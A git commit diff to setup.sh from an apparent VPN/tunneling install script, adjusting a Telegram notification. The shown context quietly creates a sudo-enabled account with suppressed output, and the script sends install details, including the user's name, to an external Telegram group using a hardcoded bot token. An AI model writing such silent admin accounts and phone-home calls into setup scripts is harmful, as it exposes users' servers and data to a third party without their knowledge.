6252d43bd876fd9c5df95e6256efeeee010c246f
[Riswan Tunneling] <vpnscriswan293@gmail.com>
2025-03-05 00:09:23 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -172,12 +172,16 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="-1002196928254"  # Ganti dengan chat ID grup kamu
-KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # API Key bot kamu
-TEXT="Test Message from Bot"  # Pesan yang ingin dikirim
+CHATID="-1002196928254"  # Ganti dengan ID grup Telegram Anda
+KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # Ganti dengan token bot Anda
+TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Tes Notifikasi ke Grup Telegram
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Pesan ini adalah tes untuk mengirim pesan ke grup Telegram.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
-curl -s -X POST $URL -d chat_id=$CHATID -d text="$TEXT" -d parse_mode=html
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL
 TEXT="Script RiswanStore. V2.5
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <code>Pengguna :</code> <code>$Name</code>
